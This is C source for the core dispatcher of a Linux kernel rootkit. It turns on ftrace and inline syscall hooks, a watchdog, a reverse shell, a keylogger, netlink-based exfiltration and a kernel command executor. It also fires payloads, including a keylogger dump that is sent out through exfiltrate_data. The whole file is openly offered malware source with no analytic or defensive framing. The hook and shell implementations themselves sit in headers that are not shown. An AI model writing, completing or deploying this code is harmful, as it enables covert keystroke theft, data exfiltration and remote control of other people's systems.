#include "rootkit_core.h"
#include "watchdog.h"
#include "reverse_shell.h"
#include "keylogger.h"
#include "recovery_trigger.h"
#include "netlink_exfil.h"
#include "command_executor.h"
#include "self_watchdog.h"
#include "ftrace_hook.h"
#include "inline_hook.h"
#include <linux/slab.h>
#include <linux/module.h>

static int module_state[MODULE_MAX];

extern struct fh_hook fh_hooks[];
extern size_t fh_hook_count;

void enable_module(enum rk_module_id id) {
    if (id >= MODULE_MAX)
        return;

    if (module_state[id])
        return;

    switch (id) {
        case MODULE_FTRACE:
            fh_install_hooks(fh_hooks, fh_hook_count);
            break;
        case MODULE_INLINE_HOOK:
            setup_inline_hooks();
            break;
        case MODULE_WATCHDOG:
            start_watchdog();
            break;
        case MODULE_REVERSE_SHELL:
            start_reverse_shell();
            break;
        case MODULE_KEYLOGGER:
            start_keylogger();
            break;
        case MODULE_NETLINK_EXFIL:
            setup_netlink_exfil();
            break;
        case MODULE_COMMAND_EXECUTOR:
            setup_command_executor();
            break;
        case MODULE_SELF_WATCHDOG:
            start_self_watchdog();
            break;
        default:
            break;
    }

    module_state[id] = 1;
}

void disable_module(enum rk_module_id id) {
    if (id >= MODULE_MAX)
        return;

    if (!module_state[id])
        return;

    switch (id) {
        case MODULE_FTRACE:
            fh_remove_hooks(fh_hooks, fh_hook_count);
            break;
        case MODULE_INLINE_HOOK:
            remove_inline_hooks();
            break;
        case MODULE_WATCHDOG:
            stop_watchdog();
            break;
        case MODULE_KEYLOGGER:
            stop_keylogger();
            break;
        case MODULE_NETLINK_EXFIL:
            cleanup_netlink_exfil();
            break;
        case MODULE_COMMAND_EXECUTOR:
            remove_command_executor();
            break;
        case MODULE_SELF_WATCHDOG:
            stop_self_watchdog();
            break;
        default:
            break;
    }

    module_state[id] = 0;
}

int is_module_enabled(enum rk_module_id id) {
    if (id >= MODULE_MAX)
        return 0;
    return module_state[id];
}

void trigger_payload(enum rk_payload_type type) {
    switch (type) {
        case PAYLOAD_REVERSE_SHELL:
            start_reverse_shell();
            break;

        case PAYLOAD_KEYLOGGER_DUMP: {
            char *dump_buf;
            size_t dump_len = 0;

            dump_buf = kmalloc(4096, GFP_KERNEL);
            if (!dump_buf)
                break;

            get_keylogger_dump(dump_buf, &dump_len);

            if (dump_len > 0)
                exfiltrate_data(dump_buf, dump_len);

            kfree(dump_buf);
            break;
        }

        case PAYLOAD_TRIGGER_RECOVERY:
            trigger_rootkit_recovery();
            break;

        case PAYLOAD_CUSTOM:
            execute_kernel_command("touch /tmp/kprz_custom_payload");
            break;

        default:
            break;
    }
}

void rootkit_core_init(void) {
    int i;
    for (i = 0; i < MODULE_MAX; i++)
        module_state[i] = 0;
}

void rootkit_core_exit(void) {
    int i;
    for (i = 0; i < MODULE_MAX; i++)
        disable_module(i);
}

MODULE_LICENSE("GPL");
